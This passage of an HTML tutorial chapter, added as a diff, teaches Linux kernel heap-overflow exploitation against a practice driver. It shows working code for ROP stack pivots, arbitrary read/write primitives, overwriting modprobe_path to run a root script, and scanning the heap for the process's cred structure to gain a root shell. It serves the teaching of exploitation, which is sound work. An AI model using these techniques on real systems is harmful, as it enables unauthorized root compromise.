+<p>Looking again at the crash message from that call, we can see that some of the <code>ioctl</code> arguments appear in registers:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RCX: 00000000deadbeef</span><br><span class="line">RDX: 00000000cafebabe</span><br><span class="line">RSI: 00000000deadbeef</span><br><span class="line">R08: 00000000cafebabe</span><br><span class="line">R12: 00000000deadbeef</span><br><span class="line">R14: 00000000cafebabe</span><br></pre></td></tr></table></figure>
+<p>That means if we pass the address of the ROP chain as an <code>ioctl</code> argument and invoke a gadget like <code>mov rsp, rcx; ret;</code>, we can begin ROP.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="Wolf" ></div>
+  <p class="says">
+    Arguments to <code>write</code> and <code>read</code> are often not useful for a stack pivot into the kernel heap, because the buffer pointer may be checked to ensure it lies in userland, or the handler may not be called when the size is too large.
+  </p>
+</div>
+<p>Even in the kernel, a simple gadget like <code>mov rsp, rcx; ret;</code> is hard to find, but gadgets of the form <code>push rcx; ...; pop rsp; ...; ret;</code> are much more likely to exist. This time we use the following gadget:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;</span><br></pre></td></tr></table></figure>
+<p>First, let’s just confirm that we can reach the ROP chain. In the example below, a crash at <code>0xffffffffdeadbeef</code> inside the ROP chain means success.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Write a fake function table</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf;</span><br><span class="line">p[<span class="number">12</span>] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Prepare the ROP chain</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">0xffffffffdeadbeef</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Control RIP</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  ioctl(spray[i], <span class="number">0xdeadbeef</span>, g_buf - <span class="number">0x10</span>); <span class="comment">// subtract space for r13 and rbp</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Privilege-escalation">Privilege escalation</h3>
+<p>At this point, all that remains is to write the actual ROP chain. Since <code>p[12]</code> is already occupied by the function pointer used to gain RIP control, either skip that slot with a <code>pop</code> gadget or place the function table after <code>ops</code> and use <code>g_buf</code> only for the ROP chain. Either approach is fine.</p>
+<p>Try writing the ROP chain in whatever style you prefer. If the ROP works correctly, privilege escalation should succeed even with KASLR, SMAP, SMEP, and KPTI all enabled.<br>
+An example exploit can be downloaded <a href="exploit/heapbof-krop.c">here</a>.</p>
+<center>
+  <img src="img/hbof_privesc.png" alt="Successful privilege escalation" style="width:320px;">
+</center>
+<h2 id="Exploiting-with-AAR-AAW">Exploiting with AAR/AAW</h2>
+<p>In the example above, we used the stack-pivot gadget <code>push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;</code>. If you searched for gadgets yourself, you probably also found only fairly complicated ones. There is no guarantee that a single RIP-control primitive will always give you a usable stack pivot. So what should we do if we cannot pivot the stack?</p>
+<p>Even in that situation, there is a <a target="_blank" rel="noopener" href="https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html">technique</a> that builds a stable exploit using gadgets that exist with high probability. Let’s again inspect the registers when RIP is controlled:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ioctl(spray[i], 0xdeadbeef, 0xcafebabe);</span><br><span class="line"></span><br><span class="line">RCX: 00000000deadbeef</span><br><span class="line">RDX: 00000000cafebabe</span><br><span class="line">RSI: 00000000deadbeef</span><br><span class="line">R08: 00000000cafebabe</span><br><span class="line">R12: 00000000deadbeef</span><br><span class="line">R14: 00000000cafebabe</span><br></pre></td></tr></table></figure>
+<p>Because we control RIP by overwriting a function pointer, in other words through a <code>call</code>, execution returns cleanly to user space as long as we jump to an instruction sequence that ends in <code>ret</code>. So what can we do with a gadget like this?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff810477f7: mov [rdx], rcx; ret;</span><br></pre></td></tr></table></figure>
+<p>Since both <code>rdx</code> and <code>rcx</code> are controlled, invoking this gadget lets us write an arbitrary 4-byte value to an arbitrary address. Gadgets of this <code>mov</code> form exist with fairly high probability. In other words, if you can control RIP through a function pointer, you can build an AAW primitive.<br>
+Now consider the following gadget:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8118a285: mov eax, [rdx]; ret;</span><br></pre></td></tr></table></figure>
+<p>In this case, the 4-byte value stored at an arbitrary address becomes the return value of <code>ioctl</code>. (<code>ioctl</code> returns <code>int</code>, so we can read up to 4 bytes at a time.) That gives us an AAR primitive as well.</p>
+<p>So what can we do with arbitrary read/write in kernel space?</p>
+<h3 id="modprobe-path-and-core-pattern"><code>modprobe_path</code> and <code>core_pattern</code></h3>
+<p>Sometimes the Linux kernel wants to launch a user-space program in response to some kernel-side event. For that purpose, it uses a function called <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/umh.c#L474"><code>call_usermodehelper</code></a>. There are several paths that use <code>call_usermodehelper</code>, but two especially useful ones that unprivileged user space can reach are <code>modprobe_path</code> and <code>core_pattern</code>.</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L61"><code>modprobe_path</code></a> is the command string used from <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L170"><code>__request_module</code></a>, and it lives in writable memory.<br>
+Linux supports several executable formats. When an executable file is run, the kernel inspects its header bytes and decides how to handle it. By default, ELF files and shebang scripts are recognized. When the kernel encounters an executable file format that does not match any registered handler, <code>__request_module</code> is called. <code>modprobe_path</code> normally contains <code>/sbin/modprobe</code>, and if we overwrite it and then attempt to execute an invalid-format file, we can make the kernel run any command we want.</p>
+<p>Similarly, another kernel-triggered command string is <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L57"><code>core_pattern</code></a>. It is the command string used by <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L577"><code>do_coredump</code></a> when a user-space program crashes. More precisely, if <code>core_pattern</code> begins with the pipe character <code>|</code>, the command following it is executed. For example, on Ubuntu 20.04 the default is:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|/usr/share/apport/apport %p %s %c %d %P %E</span><br></pre></td></tr></table></figure>
+<p>If no external command is configured, the string is simply <code>core</code>, which becomes the name of the core dump file. If we overwrite <code>core_pattern</code> with AAW, then when a user-space program crashes, the kernel will launch an external program with privileges. That means we can trigger privilege escalation simply by intentionally crashing a process.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
+  <p class="says">
+    The addresses of variables are not affected by FGKASLR, so this still looks usable even when FGKASLR is enabled.
+  </p>
+</div>
+<p>This time, let’s escalate privileges by overwriting <code>modprobe_path</code>. First we need to find its address. If symbol information is available, you can use <code>kallsyms</code> or similar tools. In this kernel, the symbols are stripped, so we have to identify it ourselves. The same applies to <code>core_pattern</code>, and in practice the easiest method is to search the string inside <code>vmlinux</code>.<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">&gt;&gt;&gt; from ptrlib import ELF</span><br><span class="line">&gt;&gt;&gt; kernel = ELF(&quot;./vmlinux&quot;)</span><br><span class="line">&gt;&gt;&gt; hex(next(kernel.search(&quot;/sbin/modprobe\0&quot;)))</span><br><span class="line">0xffffffff81e38180</span><br></pre></td></tr></table></figure>
+<p>If we confirm that in <code>gdb</code>, we can indeed see <code>/sbin/modprobe</code> there.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/1s 0xffffffff81e38180</span><br><span class="line">0xffffffff81e38180:     &quot;/sbin/modprobe&quot;</span><br></pre></td></tr></table></figure>
+<p>Now that we know the address, let’s overwrite it with AAW. When you have stable AAR/AAW, it is convenient to design the exploit so they can be called like helper functions.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AAW32</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">int</span> val)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *p = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf;</span><br><span class="line">  p[<span class="number">12</span>] = rop_mov_prdx_rcx;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line">  write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mov [rdx], rcx; ret;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    ioctl(spray[i], val <span class="comment">/* rcx */</span>, addr <span class="comment">/* rdx */</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">  <span class="type">char</span> cmd[] = <span class="string">&quot;/tmp/evil.sh&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cmd); i += <span class="number">4</span>) &#123;</span><br><span class="line">    AAW32(addr_modprobe_path + i, *(<span class="type">unsigned</span> <span class="type">int</span>*)&amp;cmd[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>In this example, when the kernel tries to execute an unknown-format file, it ends up invoking <code>/tmp/evil.sh</code>. Therefore we place whatever action we want inside <code>/tmp/evil.sh</code>. Here we use the following script:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chmod</span> -R 777 /root</span><br></pre></td></tr></table></figure>
+<p>Finally, create any invalid executable file and run it:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -e &#x27;#!/bin/sh\nchmod -R 777 /root&#x27; &gt; /tmp/evil.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/evil.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -e &#x27;\xde\xad\xbe\xef&#x27; &gt; /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/tmp/pwn&quot;</span>); <span class="comment">// trigger modprobe_path</span></span><br></pre></td></tr></table></figure>
+<p>If the exploit succeeds, an arbitrary command runs with root privileges.</p>
+<center>
+  <img src="img/hbof_modprobe_path.png" alt="Privilege escalation via modprobe_path" style="width:400px;">
+</center>
+<p>This exploit can be downloaded <a href="exploit/heapbof-aaw.c">here</a>.</p>
+<h3 id="cred-structures"><code>cred</code> structures</h3>
+<p>As explained in the <a href="stack_overflow.html">previous chapter</a>, a process’s privileges are managed by the <code>cred</code> structure. Since it stores things such as the effective user ID of the process, we can escalate privileges by rewriting the ID fields of our own process’s <code>cred</code> to root (<code>0</code>). But how do we obtain the address of our process’s <code>cred</code>?</p>
+<p>On older Linux kernels there used to be a global symbol called <code>current_task</code>, which pointed to the <code>task_struct</code> of the current process context. So if you had AAR/AAW, you could walk from <code>task_struct</code> to <code>cred</code> and escalate privileges easily.<br>
+In more recent kernels, however, <code>current_task</code> is no longer a global variable. Instead it is stored in per-CPU storage and accessed through the <code>gs</code> register. That means we cannot directly locate the process’s <code>cred</code>, but if we already have AAR, it is still relatively easy. The kernel heap is not that huge, so in kernel exploitation it is feasible to scan the heap and locate the <code>cred</code> structure. Since we already know a heap address in this exploit, that is possible here. In other words, privilege escalation can be done with code like this. (This time <code>ioctl</code> returns up to 4 bytes at a time, so we scan 4 bytes at a time.)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (u64 p = heap_address; ; p += <span class="number">4</span>) &#123;</span><br><span class="line">  u32 leak = AAR_32bit(p); <span class="comment">// AAR</span></span><br><span class="line">  <span class="keyword">if</span> (looks_like_cred(leak)) &#123; <span class="comment">// looks like a cred structure</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p + XXX, <span class="number">0</span>, YYY); <span class="comment">// rewrite effective UID</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The question is how to find our own process’s <code>cred</code>. For that, let’s look again at the members of <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/sched.h#L723"><strong><code>task_struct</code></strong></a>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="comment">/* Cached requested key. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>			*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * executable name, excluding path.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">	 * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">	 * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">char</span>				comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The important field here is <code>comm</code>. It stores up to 16 bytes of the process’s executable name. This value can be changed with the <code>PR_SET_NAME</code> option of <code>prctl</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux 2.6.9)</span><br><span class="line">    Set  the name of the calling thread, using the value in the location pointed to by (char *) arg2.  The name can be up to 16 bytes long, including the terminating null byte.  (If the</span><br><span class="line">    length of the string, including the terminating null byte, exceeds 16 bytes, the string is silently truncated.)  This is the same attribute that can be set via pthread_setname_np(3)</span><br><span class="line">    and retrieved using pthread_getname_np(3).  The attribute is likewise accessible via /proc/self/task/[tid]/comm, where tid is the name of the calling thread.</span><br></pre></td></tr></table></figure>
+<p>So we can set <code>comm</code> to a string unlikely to appear elsewhere in the kernel and then search for it with AAR. Looking at the <code>task_struct</code> definition, there is a pointer to <code>cred</code> right before <code>comm</code>, so once we find <code>comm</code> we can rewrite our own privilege information.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="Wolf" ></div>
+  <p class="says">
+    This method is convenient when you want a stable exploit across many environments, because if you have AAR/AAW, it does not depend on ROP gadgets or function offsets.
+  </p>
+</div>
+<p>Now that we understand the idea, let’s actually implement privilege escalation this way. A naive AAR implementation is fine, but in this exploit we call it many times, so trying every sprayed <code>tty_struct</code> on every read is too slow. The author therefore caches the correct file descriptor on the first call. Also, since the <code>write</code> that installs the ROP gadget only needs to happen once, skipping it on subsequent calls speeds the exploit up significantly.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cache_fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">AAR32</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (cache_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf;</span><br><span class="line">    p[<span class="number">12</span>] = rop_mov_eax_prdx;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line">    write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mov eax, [rdx]; ret;</span></span><br><span class="line">  <span class="keyword">if</span> (cache_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> v = ioctl(spray[i], <span class="number">0</span>, addr <span class="comment">/* rdx */</span>);</span><br><span class="line">      <span class="keyword">if</span> (v != <span class="number">-1</span>) &#123;</span><br><span class="line">        cache_fd = spray[i];</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(cache_fd, <span class="number">0</span>, addr <span class="comment">/* rdx */</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Next, because we do not know where <code>task_struct</code> resides on the heap, we search from a point well before the address of <code>g_buf</code>. The author found it about <code>0x200000</code> bytes earlier in <code>gdb</code>, but that depends on the environment and heap state, so we search with a generous range.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Search for task_struct</span></span><br><span class="line"><span class="keyword">if</span> (prctl(PR_SET_NAME, <span class="string">&quot;nekomaru&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">  fatal(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> addr;</span><br><span class="line"><span class="keyword">for</span> (addr = g_buf - <span class="number">0x1000000</span>; ; addr += <span class="number">0x8</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((addr &amp; <span class="number">0xfffff</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;searching... 0x%016lx\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (AAR32(addr) == <span class="number">0x6f6b656e</span></span><br><span class="line">      &amp;&amp; AAR32(addr+<span class="number">4</span>) == <span class="number">0x7572616d</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found &#x27;comm&#x27; at 0x%016lx\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Once we know where <code>comm</code> is, we can overwrite the adjacent <code>cred</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> addr_cred = <span class="number">0</span>;</span><br><span class="line">addr_cred |= AAR32(addr - <span class="number">8</span>);</span><br><span class="line">addr_cred |= (<span class="type">unsigned</span> <span class="type">long</span>)AAR32(addr - <span class="number">4</span>) &lt;&lt; <span class="number">32</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] current-&gt;cred = 0x%016lx\n&quot;</span>, addr_cred);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite effective IDs</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">  AAW32(addr_cred + i*<span class="number">4</span>, <span class="number">0</span>); <span class="comment">// id=0(root)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] pwned!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>If privilege escalation succeeds as shown below, then the exploit worked.</p>
+<center>
+  <img src="img/hbof_cred.png" alt="Privilege escalation by overwriting cred" style="width:400px;">
+</center>
+<p>In this chapter, we learned how to exploit Heap Overflow vulnerabilities in kernel space. In fact, at this point we already know enough to attack most vulnerabilities. The next chapter handles Use-after-Free in kernel space, but most vulnerabilities eventually reduce to kROP or AAR/AAW anyway, so the overall exploitation pattern stays almost the same.</p>
+<hr>
+<div class="column" title="Exercise">
+  In this chapter, we overwrote <code>modprobe_path</code> to execute a command as root.<br>
+  (1) Overwrite <code>core_pattern</code> and gain root in the same way.<br>
+  (2) Functions such as <code>orderly_poweroff</code> and <code>orderly_reboot</code> execute commands stored in <code>poweroff_cmd</code> and <code>reboot_cmd</code> respectively, as shown <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/reboot.c#L462">here</a>. Overwrite one of those command strings and then call the corresponding function through RIP control to spawn a root shell.<br>
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>Be careful, because object sizes may differ depending on the kernel version. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p>This is part of a doubly linked list used by Linux. Since many kernel objects contain such links, for example through mutex-related structures, they are useful for leaking heap addresses. <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn3" class="footnote-item"><p>Another way is to disassemble functions that use the variable and recover the address from there. <a href="#fnref3" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="stack_overflow.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="use_after_free.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
